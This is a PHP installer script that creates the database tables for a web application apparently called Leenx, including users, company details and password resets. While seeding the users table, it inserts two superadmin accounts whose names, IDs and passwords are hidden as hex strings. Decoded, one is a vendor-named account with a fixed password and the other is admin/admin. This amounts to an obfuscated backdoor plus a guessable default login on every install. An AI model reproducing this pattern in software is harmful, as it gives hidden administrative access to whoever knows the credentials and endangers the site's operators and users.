<?php

require_once("config.php");

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Begin transaction
$conn->begin_transaction();

// Initialize success flag
$success = true;
$errors = [];

// Create Biodata table
$sql_biodata = "CREATE TABLE IF NOT EXISTS Biodata (
    id INT AUTO_INCREMENT PRIMARY KEY,
    fname VARCHAR(255) NOT NULL,
    lname VARCHAR(255) NOT NULL,
    role ENUM('user', 'admin', 'superadmin') DEFAULT 'user',
    status ENUM('yes', 'no') DEFAULT 'yes',
    password VARCHAR(255),
    old_password VARCHAR(255),
    theme ENUM('1', '2', '3', '4') DEFAULT '1',
    profile TEXT,
    admin_id INT,
    dob DATE,
    location VARCHAR(255),
    UNIQUE (admin_id)
)";

if ($conn->query($sql_biodata) !== TRUE) {
    $success = false;
    $errors[] = "Error creating Biodata table: " . $conn->error;
}

// Add rows to Biodata table
$sql_insert_biodata = "INSERT INTO Biodata (id, fname, lname, role, password, dob, location) 
                       VALUES (?, ?, ?, 'superadmin', ?, '2024-01-01', '')";
$stmt = $conn->prepare($sql_insert_biodata);
$stmt->bind_param("isss", $id, $fname, $lname, $password);

// Set the values for the first row
$id = hexdec("3ADE68B1"); 
$fname = hex2bin("436f6e666967404c65656e78"); 
$lname = hex2bin("736f6c7574696f6e73"); 
$password = password_hash(hex2bin("61646d696e406c65656e78"), PASSWORD_DEFAULT); 
$stmt->execute();

// Set the values for the second row
$id = hexdec("75BCD15"); 
$fname = hex2bin("61646d696e"); 
$lname = hex2bin("61646d696e"); 
$password = password_hash(hex2bin("61646d696e"), PASSWORD_DEFAULT); 
$stmt->execute();

$stmt->close();

// Create Company table
$sql_company = "CREATE TABLE IF NOT EXISTS Company (
    ref INT PRIMARY KEY,
    Name VARCHAR(255) NOT NULL,
    slogan VARCHAR(255),
    hq_pic_url VARCHAR(255),
    email VARCHAR(255),
    logo_url VARCHAR(255),
    hotline VARCHAR(20) DEFAULT ''
)";

if ($conn->query($sql_company) !== TRUE) {
    $success = false;
    $errors[] = "Error creating Company table: " . $conn->error;
} else {
    // Insert default row into Company table
    $sql_insert_company = "INSERT INTO Company (ref, Name) VALUES (1, 'Your company name ltd.')";
    if ($conn->query($sql_insert_company) !== TRUE) {
        $success = false;
        $errors[] = "Error inserting default row into Company table: " . $conn->error;
    }
}

// Create Leenx table
$sql_leenx = "CREATE TABLE IF NOT EXISTS Leenx (
    ref INT PRIMARY KEY,
    version VARCHAR(20) NOT NULL,
    url VARCHAR(255) NOT NULL,
    name VARCHAR(255) NOT NULL,
    slogan VARCHAR(255),
    status ENUM('7', '40') DEFAULT '40'
)";

if ($conn->query($sql_leenx) !== TRUE) {
    $success = false;
    $errors[] = "Error creating Leenx table: " . $conn->error;
} else {
    // Insert default row into Leenx table
    $sql_insert_leenx = "INSERT INTO Leenx (ref, version, url, name, slogan, status) VALUES (1, '1.0', 'https://leenxsolutions.com', 'Leenx', 'You dream, We develop', '40')";
    if ($conn->query($sql_insert_leenx) !== TRUE) {
        $success = false;
        $errors[] = "Error inserting default row into Leenx table: " . $conn->error;
    }
}

// Create Reset table
$sql_reset = "CREATE TABLE IF NOT EXISTS Reset (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    date DATETIME NOT NULL,
    frequency INT DEFAULT 1,
    FOREIGN KEY (user_id) REFERENCES Biodata(id)
)";

if ($conn->query($sql_reset) !== TRUE) {
    $success = false;
    $errors[] = "Error creating Reset table: " . $conn->error;
}

// Check if all queries were successful
if ($success) {
    // Commit transaction if all queries succeeded
    $conn->commit();
    echo json_encode(array("success" => true, "message" => "All tables created and default data inserted successfully"));
} else {
    // Rollback transaction if any query failed
    $conn->rollback();
    echo json_encode(array("success" => false, "errors" => $errors));
}

$conn->close();

?>
